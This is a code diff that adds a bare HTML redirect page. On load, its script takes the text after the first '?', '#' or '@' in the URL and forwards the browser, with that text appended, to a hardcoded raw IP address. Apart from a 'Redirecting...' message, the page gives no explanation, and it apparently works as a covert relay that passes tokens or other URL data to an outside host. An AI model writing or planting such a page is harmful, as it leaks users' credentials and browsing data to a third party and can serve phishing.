@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    window.onload = function() {
+      let url = window.location.href;
+      let queryIndex = url.indexOf("?");
+      let hashIndex = url.indexOf("#");
+      let atIndex = url.indexOf("@");
+      
+      let indices = [queryIndex, hashIndex, atIndex].filter(i => i >= 0);
+      if(indices.length === 0) {
+        document.body.innerHTML = "<p>No redirect parameter found.</p>";
+        return;
+      }
+      let start = Math.min(...indices);
+      let redirectPart = url.substring(start + 1);
+      window.location.href = "http://104.168.50.72/" + redirectPart;
+    }
+  </script>
+</head>
+<body>
+  Redirecting...
+</body>
+</html>
